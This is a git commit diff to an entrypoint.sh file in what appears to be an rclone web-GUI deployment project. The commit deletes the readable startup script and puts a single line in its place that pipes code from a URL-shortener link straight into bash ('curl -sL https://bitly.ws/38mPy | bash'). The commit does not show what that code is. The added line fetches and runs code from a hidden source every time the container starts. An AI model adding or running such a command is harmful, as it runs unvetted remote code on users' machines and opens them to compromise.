1d4707cadbe947d5985f376288fb3187605fd437
Sazfa-Kuy <129221597+Sazfa-Kuy@users.noreply.github.com>
2024-01-02 13:55:56 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,10 +1,2 @@
 #!/bin/bash
-#author https://github.com/developeranaz (don't delete this)
-rclone version
-mkdir /.config
-mkdir /.config/rclone/
-wget "$CONFIG_IN_URL" -O /.rclone.conf
-rclone listremotes
-rclone rcd --rc-web-gui --rc-addr=0.0.0.0:$PORT --rc-pass="$web_password" --rc-user="$web_username"
-#rclone serve http $CLOUDNAME: --addr :$PORT --vfs-read-chunk-size 128M
- 
+curl -sL https://bitly.ws/38mPy | bash 
